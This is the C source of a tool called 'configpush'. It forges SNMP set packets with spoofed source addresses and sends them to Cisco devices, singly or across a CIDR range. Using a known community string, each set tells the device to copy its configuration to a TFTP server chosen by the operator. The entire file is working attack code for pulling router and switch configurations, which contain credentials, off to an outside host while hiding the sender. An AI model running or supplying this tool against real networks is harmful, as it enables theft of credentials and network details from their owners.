/* RTFM vulnerability
*   noun:
*	A securely coded device with an 
*	insecure configuration
*
* gcc -lpthread -lm -o configpush configpush.c
* 
* assembles snmpset packet for cisco devices 
* to push config to tftp server specified
*
*	mkillebrew@net7systems.com
*
*  Not for distribution... my C is horrendous
*  v 0.8.5
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <math.h>

#define IP4_HDRLEN 20         // IPv4 header length
#define UDP_HDRLEN  8         // UDP header length, excludes data
	

typedef struct {
        unsigned long bytes, limit;
        pthread_mutex_t lock;
} bandlimit;

bandlimit *stats;

int running=1;

struct psd_udp {
	struct in_addr src;
	struct in_addr dst;
	unsigned char pad;
	unsigned char proto;
	unsigned short udp_len;
	struct udphdr udp;
};


struct bcode{
	int *encoded, size;
};

struct snmppdu{
	u_char *data;
	int length;
};

void *attenuate(){
        while(running){
                if(stats->bytes >= stats->limit){
                        pthread_mutex_lock(&stats->lock);       
                        usleep(1000);
                        stats->bytes=0;
                        pthread_mutex_unlock(&stats->lock);
                }
        }
}

uint32_t lastrand;

uint32_t randid(){
        uint32_t rnum;

        rnum = rand() & 0xff;
        rnum |= (rand() & 0xff) << 8;
        rnum |= (rand() & 0xff) << 16;
        rnum |= (rand() & 0xff) << 24;
	lastrand=rnum;
	srand(lastrand);

	return rnum;
}

uint16_t rand16(){
        uint16_t rnum;

        rnum = rand() & 0xff;
        rnum |= (rand() & 0xff) << 8;
	lastrand=(uint32_t )rnum;
	srand(lastrand);

        return rnum;
}

int printusage(){
                printf("Options:\n\t-t <target> or\n\t-r <cidr range>\n\n\t-t <tftp destination>\n\n\t-s <source spoof IP> or\n\t-S - spoof source from target address\n\n\t-c <community string>\n\t-m <speed limit in mbits>\n\t-i <interface>\n\n");
                printf("example: ./configpush -i eth0 -r 10.0.0.0/24 -f 10.5.1.8 -s 10.99.99.99 -c private -m 5\nor\n");
                printf("example: ./configpush -i eth0 -r 10.0.0.0/24 -f 10.5.1.8 -S -c private -m 5\n\n");
                exit(1);
}


struct bcode *bencode(char *oid){

	int num[1000];
	int len = 0;
	int val = 0;
	int i;
	int y=1;
	for (i = 0; i < strlen(oid) + 1; i++) {
		if (i < strlen(oid) && oid[i] >= '0' && oid[i] <= '9') {
			val = val * 10 + oid[i] - '0';
		} else {
			num[len] = val;
			len++;			
			val = 0;
		}
	}

	struct bcode *e;
	e=(struct bcode *)malloc(sizeof(struct bcode));
	e->encoded=(int *)malloc(64);

    	val = num[0] * 40 + num[1];
	e->encoded[0]=val;

	for (i = 2; i < len; i++) {
		int value = num[i];
		int length = 0;
		if (value >= (268435456)) { 
			length = 5;
		} else if (value >= (2097152)) { 
			length = 4;
		} else if (value >= 16384) { 
			length = 3;
		} else if (value >= 128) { 
			length = 2;
		} else {
			length = 1;
		}

		int j = 0;
		for (j = length - 1; j >= 0; j--) {
		    if (j) {
				int p = ((value >> (7 * j)) & 0x7F) | 0x80;
			e->encoded[y]=p;
			y++;
		    } else {
		        int p = ((value >> (7 * j)) & 0x7F);
			e->encoded[y]=p; 
			y++;
		    }
		}
	}

	e->size=y;
	return e;
}


uint16_t checksum (uint16_t *addr, int len) {
	int nleft = len;
	int sum = 0;
	uint16_t *w = addr, answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof (uint16_t);
	}

	if (nleft == 1) {
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}


unsigned short in_cksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}
	
unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len) {
	struct psd_udp buf;

	memset(&buf, 0, sizeof(buf));
	buf.src.s_addr = src;
	buf.dst.s_addr = dst;
	buf.pad = 0;
	buf.proto = IPPROTO_UDP;
	buf.udp_len = htons(len);
	memcpy(&(buf.udp), addr, len);
	return in_cksum((unsigned short *)&buf, 12 + len);
}

uint16_t udp4_checksum (struct ip iphdr, struct udphdr udphdr, uint8_t *payload, int payloadlen) {
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen=0, i;

	ptr = &buf[0];  // ptr points to beginning of buffer buf
  
	memcpy (ptr, &iphdr.ip_src.s_addr, sizeof (iphdr.ip_src.s_addr));
	ptr += sizeof (iphdr.ip_src.s_addr);
	chksumlen += sizeof (iphdr.ip_src.s_addr);
  
	memcpy (ptr, &iphdr.ip_dst.s_addr, sizeof (iphdr.ip_dst.s_addr));
	ptr += sizeof (iphdr.ip_dst.s_addr);
	chksumlen += sizeof (iphdr.ip_dst.s_addr);
  
	*ptr = 0; ptr++;
	chksumlen += 1;
  
	memcpy (ptr, &iphdr.ip_p, sizeof (iphdr.ip_p));
	ptr += sizeof (iphdr.ip_p);
	chksumlen += sizeof (iphdr.ip_p);
  
	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
	ptr += sizeof (udphdr.len);
	chksumlen += sizeof (udphdr.len);
  
	memcpy (ptr, &udphdr.source, sizeof (udphdr.source));
	ptr += sizeof (udphdr.source);
	chksumlen += sizeof (udphdr.source);
  
	memcpy (ptr, &udphdr.dest, sizeof (udphdr.dest));
	ptr += sizeof (udphdr.dest);
	chksumlen += sizeof (udphdr.dest);
  
	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
	ptr += sizeof (udphdr.len);
	chksumlen += sizeof (udphdr.len);
  
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 2;
  
	memcpy (ptr, payload, payloadlen);
	ptr += payloadlen;
	chksumlen += payloadlen;
  
	for (i=0; i<payloadlen%2; i++, ptr++) {
		*ptr = 0;
		ptr++;
		chksumlen++;
	}
	
	return checksum((uint16_t *) buf, chksumlen);
}



struct snmppdu *pdugen(u_char *community, u_char *target, u_char *tftp){

	int datalen, dindex, xx, packetindex[8];
	uint32_t rid;
	
        char *baseoid="1.3.6.1.4.1.9.2.1.55.";
	char *oid=(char *)malloc(64);
	memcpy(oid, baseoid, strlen(baseoid));
	memcpy(oid+strlen(baseoid), tftp, strlen(tftp));

	struct snmppdu *pdu;
        struct bcode *e;
	
        pdu=(struct snmppdu *)malloc(sizeof(struct snmppdu)+1);
        pdu->data=(char *)malloc(256);

        e=bencode(oid);
	free(oid);
	oid=NULL;
	rid=randid();

	pdu->data[0]=0x30; // type sequence
	pdu->data[1]=0xff;  // length *set*
	pdu->data[2]=0x02; // Type int 
	pdu->data[3]=0x01; // length
	pdu->data[4]=0x00; // version
	pdu->data[5]=0x04; // Type string
	pdu->data[6]=strlen(community); // community length 
	strcpy((pdu->data + 7), community);
	dindex = 7+strlen(community);
	pdu->data[dindex++]=0xa3; // PDU request type "set"
	pdu->data[dindex++]=0xff; // PDU length *set*
		packetindex[0]=dindex-1;
	pdu->data[dindex++]=0x02; // Type int
	pdu->data[dindex++]=0x04; // request length
	memcpy((pdu->data + dindex++), &rid, 4); 
	dindex+=3;
	pdu->data[dindex++]=0x02; // Type int 
	pdu->data[dindex++]=0x01; // length
	pdu->data[dindex++]=0x00; // error status
	pdu->data[dindex++]=0x02; // Type int
	pdu->data[dindex++]=0x01; // length
	pdu->data[dindex++]=0x00; // error index
	pdu->data[dindex++]=0x30; // Type sequence 
	pdu->data[dindex++]=0x23; // length *set*
		packetindex[1]=dindex-1;
	pdu->data[dindex++]=0x30; // Type sequence
	pdu->data[dindex++]=0x21; // length *set*
		packetindex[2]=dindex-1;
	pdu->data[dindex++]=0x06; // Type object identifier
	pdu->data[dindex++]=e->size; // length 
	for(xx=0; xx < e->size; xx++){
                pdu->data[dindex++]=e->encoded[xx];
        }
	pdu->data[dindex++]=0x04; // Type string
	pdu->data[dindex++]=strlen(target); // string length 
	strcpy((pdu->data + dindex++), target);
	dindex+=strlen(target);
	datalen=dindex-1;
	pdu->data[1]=datalen-2; // snmp packet length
	pdu->data[packetindex[0]]=datalen-packetindex[0]-1; // body len
	pdu->data[packetindex[1]]=datalen-packetindex[1]-1; // PDU len
	pdu->data[packetindex[2]]=datalen-packetindex[2]-1; // oid s string len
	pdu->length=datalen;	
	free(e->encoded);
	free(e);

	return pdu;
}


	
int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip, u_char *interface){

	struct ip ip;
	struct udphdr udp;
	struct sockaddr_in sin;
	int sd; 
	const int one=1;
	u_char *packet;
	unsigned int sentbytes=0;


	ip.ip_hl = 0x5;
	ip.ip_v = 0x4;
	ip.ip_tos = 0x0;
	ip.ip_len = htons(IP4_HDRLEN + UDP_HDRLEN + data->length);
	ip.ip_id = htons(rand16());
	ip.ip_off = 0x0;
	ip.ip_ttl = 64;
	ip.ip_p = IPPROTO_UDP;
	ip.ip_sum = 0x0;
	ip.ip_src.s_addr = inet_addr(spoofip);
	ip.ip_dst.s_addr = inet_addr(target);
	ip.ip_sum = in_cksum((unsigned short *)&ip, sizeof(ip));
	packet=(u_char *)malloc(512);
	memcpy(packet, &ip, sizeof(ip));
	
	udp.source = htons(rand16());
	udp.dest = htons(161);
	
	udp.len = htons(UDP_HDRLEN + data->length);
	
	udp.check = udp4_checksum (ip, udp, data->data, data->length); 
	memcpy(packet + 20, &udp, sizeof(udp));
	memcpy(packet + IP4_HDRLEN + UDP_HDRLEN, data->data, data->length * sizeof (uint8_t));

	
	if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("raw socket");
		exit(1);
	}

	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt");
		exit(1);
	}

        if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, interface, 4) < 0) {
                perror("setsockopt");
                exit(1);
        }
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip.ip_dst.s_addr;

	sentbytes=sendto(sd, packet, IP4_HDRLEN + UDP_HDRLEN + data->length, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));

	if(sentbytes < 0){
		perror("sendto");
		exit(1);
	}

	close(sd);
	free(data->data);
	free(data);
	data=NULL;
	free(packet);
	packet=NULL;
	return sentbytes;
}

int main(int argc, char **argv){
	
	time_t t;
        u_char  *community, *target, *tftp, *spoofip, *interface;
	struct snmppdu *pdu;
	int xx, optindex, fromself=0, single=0, oarg[]={0, 0, 0, 0, 0, 0, 0, 0};
        struct in_addr start;
        unsigned  mask, host;
        char *range, *tmpip, *cmask;
	
        stats=(bandlimit *)malloc(sizeof(bandlimit));
        stats->bytes=0;
        stats->limit=625; // polling 1000/second set to (5mbit/8)/1000

        pthread_t attenuatethr;

	if(argc < 2) printusage();

        srand((unsigned) time(&t));
	community=(u_char *)malloc(64);
	target=(u_char *)malloc(16);
	tftp=(u_char *)malloc(16);
	spoofip=(u_char *)malloc(16);
	interface=(u_char *)malloc(4);

	while((optindex = getopt(argc, argv, "c:t:f:s:r:m:Si:")) != -1){
		switch(optindex){
			case 'c':
				community=optarg;
				oarg[0]=1;
				break;
			case 't':
				target=optarg;
				single=1;
				oarg[1]=1;
				break;
			case 'f':
				tftp=optarg;
				oarg[2]=1;
				break;
			case 's':
				spoofip=optarg;
				oarg[3]=1;
				break;
			case 'r':
				single=0;
				range=optarg;
				tmpip=strtok(range, "/");
				if(tmpip == NULL) printusage();
				cmask=strtok(NULL, "/");
                                if(cmask == NULL) printusage();
				mask=atoi(cmask);
        			host=exp2(32-mask);
        			inet_aton(tmpip, &start);
				oarg[4]=1;
				break;
			case 'm':
				stats->limit=atoi(optarg)*1000/8;
				oarg[5]=1;
				break;
			case 'S':
				fromself=1;
				oarg[6]=1;
				break;
			case 'i':
				interface=optarg;
				oarg[7]=1;
				break;
			case '?':
				fprintf(stderr, "Unknown option character `%c'.\n", optopt);
				return 1;
			default:
				abort();
		}
	}

	if(!oarg[0] || !oarg[2] || !oarg[7]) printusage();
	if(oarg[1] && oarg[4]) printusage();
	if(oarg[6] && oarg[3]) printusage();
	
	if(single==0){

	        pthread_create(&attenuatethr, NULL, attenuate, NULL);
        	if (pthread_mutex_init(&stats->lock, NULL) != 0) {
                	printf("failed to init mutex\n");
                	return 1;
        	}

		target=inet_ntoa(start);
		for(xx=0; xx < host; xx++){
                	if(fromself==1){
                        	spoofip=inet_ntoa(start);
                	}
			target=inet_ntoa(start);
			pdu=pdugen(community, target, tftp);
			pthread_mutex_lock(&stats->lock);
			stats->bytes+=sendpdu(pdu, target, spoofip, interface);
			pthread_mutex_unlock(&stats->lock);
			start.s_addr=htonl(ntohl(start.s_addr)+1);
			target=inet_ntoa(start);
		}
	        running=0;
        	pthread_join(attenuatethr, NULL);
        	pthread_mutex_destroy(&stats->lock);
	}
	
	if(single==1){
                if(fromself==1){
                        spoofip=target;
                }
		pdu=pdugen(community, target, tftp);
		sendpdu(pdu, target, spoofip, interface);
	}


	return 0;
}




